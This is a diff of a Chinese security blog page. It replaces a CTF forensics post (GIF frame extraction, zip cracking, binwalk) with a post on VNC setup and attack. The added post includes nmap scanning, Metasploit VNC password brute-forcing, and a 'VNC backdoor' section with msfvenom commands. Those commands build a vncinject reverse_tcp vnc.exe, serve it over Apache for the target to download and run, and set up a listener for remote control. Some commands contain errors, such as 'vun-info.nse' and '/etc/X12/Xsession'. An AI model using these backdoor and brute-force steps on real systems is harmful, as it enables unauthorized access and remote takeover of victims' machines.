@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTF取证, WAI-clear">
+    <meta name="keywords" content="VNC, WAI-clear">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTF取证 | WAI-clear</title>
+    <title>VNC | WAI-clear</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CTF取证</h1>
+                    <h1 class="description center-align post-title">VNC</h1>
                 </div>
             </div>
         </div>
@@ -430,8 +430,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF%E5%8F%96%E8%AF%81/">
-                                <span class="chip bg-color">CTF取证</span>
+                            <a href="/tags/VNC/">
+                                <span class="chip bg-color">VNC</span>
                             </a>
                         
                     </div>
@@ -442,8 +442,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" class="post-category">
+                                远程桌面连接
                             </a>
                         
                     </div>
@@ -455,7 +455,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-06-29
+                    2020-07-01
                 </div>
                 
 
@@ -471,94 +471,56 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="GIF文件取证实战："><a href="#GIF文件取证实战：" class="headerlink" title="GIF文件取证实战："></a><strong>GIF文件取证实战</strong>：</h4><p><strong>GIF文件介绍</strong>：gif(Graphics Interchange Format,图形交换格式)文件是由CompuServe公司开发的图形文件格式。</p>
-<p>在线GIF制作：<a href="http://www.soogif.com/gifTool" target="_blank" rel="noopener">http://www.soogif.com/gifTool</a></p>
+                <p><strong>VNC（Virtual Network Computing)</strong>：是一个网络远程控制终端，类似于网络远程桌面的服务。</p>
+<p>判断是否开启vnc服务：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p <span class="number">5900</span> 目标地址</span><br></pre></td></tr></table></figure>
+
+<h5 id="VNC环境搭建："><a href="#VNC环境搭建：" class="headerlink" title="VNC环境搭建："></a><strong>VNC环境搭建</strong>：</h5><p>安装依赖项:</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal</span><br></pre></td></tr></table></figure>
+
+<p>sudo apt install vnc-server #选择可选版本再下载</p>
+<h5 id="设置密码："><a href="#设置密码：" class="headerlink" title="设置密码："></a><strong>设置密码</strong>：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncpasswd 设置密码为<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="启动："><a href="#启动：" class="headerlink" title="启动："></a><strong>启动</strong>：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vncserver :<span class="number">1</span></span><br><span class="line">#设置分辨率</span><br><span class="line">vncserver :<span class="number">1</span> -geometry <span class="number">1024</span>x768 -depth</span><br></pre></td></tr></table></figure>
+
+<h5 id="终止："><a href="#终止：" class="headerlink" title="终止："></a><strong>终止</strong>：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncserver -kill :<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="修改配置文件："><a href="#修改配置文件：" class="headerlink" title="修改配置文件："></a><strong>修改配置文件</strong>：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.vnc/xstartup</span><br><span class="line">#添加下面内容</span><br><span class="line">exec gnome-session&amp;</span><br><span class="line">exec gnome-panel&amp;</span><br><span class="line">exec gnome-settings-daemon&amp;</span><br><span class="line">exec metacity&amp;</span><br></pre></td></tr></table></figure>
+
+<h5 id="kali下的服务端xstartup配置："><a href="#kali下的服务端xstartup配置：" class="headerlink" title="kali下的服务端xstartup配置："></a>kali下的服务端xstartup配置：</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xrdb $HOME/.Xresources</span><br><span class="line">xsetroot -solid grey</span><br><span class="line">export XKL_XMODMAP_DISABLE=<span class="number">2</span></span><br><span class="line">/etc/X12/Xsession</span><br><span class="line">exec gnome-session &amp;</span><br><span class="line">exec gnome-panel &amp;</span><br><span class="line">exec gnome-settings-daemon &amp;</span><br><span class="line">exec metacity &amp;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="查看是否开启vnc服务（端口5901）："><a href="#查看是否开启vnc服务（端口5901）：" class="headerlink" title="查看是否开启vnc服务（端口5901）："></a><strong>查看是否开启vnc服务（端口5901）</strong>：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#客户端探测方法：</span><br><span class="line">nmap 目标主机</span><br><span class="line">#服务端本地探测方法:</span><br><span class="line">sudo netstat -tnl |grep <span class="number">5901</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="客户端连接："><a href="#客户端连接：" class="headerlink" title="客户端连接："></a><strong>客户端连接</strong>：</h5><ul>
+<li>kali Linux</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncviewer 目标主机:端口   #<span class="number">192</span>.<span class="number">168</span>.<span class="number">32</span>.<span class="number">136</span>:<span class="number">5901</span></span><br></pre></td></tr></table></figure>
+
 <ul>
-<li><p>分离GIF图片，得到隐藏信息</p>
-<p>GIF图片隐藏信息：可以利用GIF的某张具体图片隐藏具体信息，加快GIF播放速度使得肉眼无法识别Flag值。</p>
-<p>思路：分离GIF文件中的图片，查看具体图片得到Flag值</p>
-<p>方法：在Linux下使用：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">convert</span> gif文件名 %<span class="number">02</span>d.png</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>GIF图片分离组合:</p>
-<p><strong>分离图片</strong>：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">convert</span> gif文件名 %<span class="number">02</span>d.png</span><br></pre></td></tr></table></figure>
-
-<p><strong>去除图片的白色背景</strong>：第一个$filename是操作的文件，第二个是结果存储文件</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls *.png|while read filename;<span class="keyword">do</span> <span class="built_in">convert</span> $filename -transparent white $filename;done</span><br></pre></td></tr></table></figure>
-
-<p><strong>查看图片</strong>：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eog *.png</span><br></pre></td></tr></table></figure>
-
-<p><strong>合并图片</strong>：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls *.png| while read filename;<span class="keyword">do</span> <span class="built_in">convert</span> $filename <span class="number">00</span>.png    </span><br><span class="line">-gravity center(居中合并) -composite(组合) <span class="number">00</span>.png; done</span><br></pre></td></tr></table></figure>
-
+<li><p>windows:</p>
+<p>下载地址：<a href="https://www.tightvnc.com/download/2.8.11/tightvnc-2.8.11-gpl-setup-64bit.msi" target="_blank" rel="noopener">https://www.tightvnc.com/download/2.8.11/tightvnc-2.8.11-gpl-setup-64bit.msi</a></p>
 </li>
 </ul>
-<h4 id="文件类型实战："><a href="#文件类型实战：" class="headerlink" title="文件类型实战："></a><strong>文件类型实战</strong>：</h4><p>查看文件类型：file 文件名</p>
+<h5 id="VNC信息探测："><a href="#VNC信息探测：" class="headerlink" title="VNC信息探测："></a><strong>VNC信息探测</strong>：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vun-info.nse -p <span class="number">5901</span> 目标IP地址</span><br></pre></td></tr></table></figure>
+
+<h5 id="vnc密码破解："><a href="#vnc密码破解：" class="headerlink" title="vnc密码破解："></a><strong>vnc密码破解</strong>：</h5><p> <strong>注</strong>：针对RFB protocol version 3.3,3.7,3.8 和4.001</p>
 <ul>
-<li><p>文件类型实战：破解加密zip文件</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -b -D -v -u -p 字典文件.txt 压缩文件.zip</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>通过file指令发现是minx filesystem等字眼说明是系统文件，通过挂载文件获取隐藏信息：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> mountpoint</span><br><span class="line">ls</span><br><span class="line">mount 文件名 mountpoint/</span><br></pre></td></tr></table></figure>
+<li><p>基于Metasploit: </p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 启动</span><br><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/vnc/vnc_login </span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">32</span>.<span class="number">136</span>(目标主机)</span><br><span class="line"><span class="built_in">set</span> rport  未使用的端口号</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<h4 id="JPG-Magic-Header实战："><a href="#JPG-Magic-Header实战：" class="headerlink" title="JPG Magic Header实战："></a><strong>JPG Magic Header实战</strong>：</h4><p><strong>magic header介绍</strong>：具有无法解释的含义的唯一值，用于识别文件格式或协议的常量数值或文本值：</p>
-<ul>
-<li><p>十六进制打开文件，修改文件头；</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexeditor 文件名</span><br></pre></td></tr></table></figure>
-
+<h5 id="VNC安全设置："><a href="#VNC安全设置：" class="headerlink" title="VNC安全设置："></a><strong>VNC安全设置</strong>：</h5><ul>
+<li><p>修改默认端口号：</p>
+<p>配置文件位置：/usr/bin/vncserver,将<strong>$vncPort</strong>修改为其他端口，来防范扫描5901，5900端口.<strong>nmap扫描端口是，有端口和服务的映射表，是固定的，所以修改了端口号后，nmap不会扫描出是vnc服务</strong>。</p>
 </li>
 </ul>
-<h4 id="PCAP文件图片提取："><a href="#PCAP文件图片提取：" class="headerlink" title="PCAP文件图片提取："></a><strong>PCAP文件图片提取</strong>：</h4><ul>
-<li><p>​    <strong>使用wireshark分析导出图片文件</strong>：    </p>
-</li>
-<li><p><strong>使用命令行</strong>：</p>
-<ul>
-<li><p>使用binwalk查看pcap包中的文件</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk xx.pcap</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>foremost分离文件：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost xx.pcap</span><br></pre></td></tr></table></figure>
+<h5 id="VNC后门："><a href="#VNC后门：" class="headerlink" title="VNC后门："></a><strong>VNC后门</strong>：</h5><p> 使用metasploit生成后门:</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#查看所有payloads</span><br><span class="line">msfvenom --list payloads </span><br><span class="line">#查看使用的payload需要配置的选项</span><br><span class="line">msfvenom -p 使用的payload --list-options</span><br><span class="line">#生成payload保存到vnc.exe</span><br><span class="line">msfvenom  -p  windows/x64/vncinject/reverse_tcp  </span><br><span class="line">LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">32</span>.<span class="number">136</span> LPORT=<span class="number">5556</span> -f exe -o vnc.exe </span><br><span class="line">#启动apache</span><br><span class="line">service apache2 <span class="built_in">start</span></span><br><span class="line">#启动监听</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/vncinject/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 本地IP地址</span><br><span class="line"><span class="built_in">set</span> lport 未使用端口(vnc.exe中设置的端口)</span><br><span class="line"><span class="built_in">set</span> viewonly false #可以操作目标机器</span><br><span class="line">exploit #启动对应payload的监听</span><br></pre></td></tr></table></figure>
 
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="pcap提取敏感信息文件："><a href="#pcap提取敏感信息文件：" class="headerlink" title="pcap提取敏感信息文件："></a><strong>pcap提取敏感信息文件</strong>：</h4><ul>
-<li><p>​    <strong>使用wireshark分析导出图片文件</strong>：    </p>
-</li>
-<li><p><strong>使用命令行(数据包比较小时)</strong>：</p>
-<p>匹配包含password字段的内容</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xxx.pcap | grep -i "password"</span><br></pre></td></tr></table></figure>
-
-<p>base64解密，xx==是base64加密字段</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> "xx==" | base64 -d</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="binwalk提取敏感信息实战："><a href="#binwalk提取敏感信息实战：" class="headerlink" title="binwalk提取敏感信息实战："></a><strong>binwalk提取敏感信息实战</strong>：</h4><p>通过file指令查明文件类型</p>
-<ul>
-<li><p>分离ico文件中的隐藏信息:提取分离文件会产生一个文件夹 </p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e foo.ico</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h4 id="修复ZIP文件提取敏感信息实战："><a href="#修复ZIP文件提取敏感信息实战：" class="headerlink" title="修复ZIP文件提取敏感信息实战："></a><strong>修复ZIP文件提取敏感信息实战</strong>：</h4><p>查看文件类型：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 文件名</span><br></pre></td></tr></table></figure>
-
-<p>如果是zip/gz文件，使用unzip/gunzip解压</p>
-<p>修改文件为zip文件，只需将数据移动到.zip文件中。</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv file file.zip</span><br></pre></td></tr></table></figure>
-
-<p>解压过程发现bad zipfile offset字段，可能是zip签名(正确文件开头:50 4B 03 04)被修改。</p>
-<p>binwalk -e 提取已知类型的文件内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexeditor file.zip</span><br><span class="line">unzip&#x2F;(binwalk -e) file.zip</span><br></pre></td></tr></table></figure>
-
-
-
+<h5 id="启动后门"><a href="#启动后门" class="headerlink" title="启动后门:"></a><strong>启动后门</strong>:</h5><p>目标机器通过http服务（本地启动了apache作为web服务器）下载vnc.exe并运行就会反弹shell。</p>
 
             </div>
             <hr/>
@@ -584,7 +546,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wai-clear.github.io/2020/06/29/CTF%E5%8F%96%E8%AF%81/">https://wai-clear.github.io/2020/06/29/CTF%E5%8F%96%E8%AF%81/</a>
+                    <a href="https://wai-clear.github.io/2020/07/01/VNC/">https://wai-clear.github.io/2020/07/01/VNC/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -622,8 +584,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF%E5%8F%96%E8%AF%81/">
-                                    <span class="chip bg-color">CTF取证</span>
+                                <a href="/tags/VNC/">
+                                    <span class="chip bg-color">VNC</span>
                                 </a>
                             
                         </div>
@@ -791,9 +753,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/07/01/VNC/">
                     <div class="card-image">
@@ -816,9 +779,9 @@ VNC环境搭建：安装依赖项:
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -831,6 +794,7 @@ VNC环境搭建：安装依赖项:
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -849,37 +813,20 @@ VNC环境搭建：安装依赖项:
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/06/29/web%E5%AE%89%E5%85%A8python%E5%9F%BA%E7%A1%80/">
+                <a href="/2020/06/29/CTF%E5%8F%96%E8%AF%81/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="web安全python基础">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="CTF取证">
                         
-                        <span class="card-title">web安全python基础</span>
+                        <span class="card-title">CTF取证</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            http协议介绍
-协议分类
-HTTP1.0  80端口
-HTTP1.1  80端口
-
-
-协议弊端和修正
-弊端： 明文传输不安全
-修在：使用HTTPS协议，加密传输数据
-
-
-请求方法：
-HTTP1.0
-GET
-POST
-HEAD
-
-
-HTTP
+                            GIF文件取证实战：GIF文件介绍：gif(Graphics Interchange Format,图形交换格式)文件是由CompuServe公司开发的图形文件格式。
+在线GIF制作：http://www.soogif.com/gifToo
                         
                     </div>
                     <div class="publish-info">
@@ -890,8 +837,8 @@ HTTP
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/web/" class="post-category">
-                                    web
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
                                 </a>
                             
                             
@@ -901,8 +848,8 @@ HTTP
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python/">
-                        <span class="chip bg-color">python</span>
+                    <a href="/tags/CTF%E5%8F%96%E8%AF%81/">
+                        <span class="chip bg-color">CTF取证</span>
                     </a>
                     
                 </div>
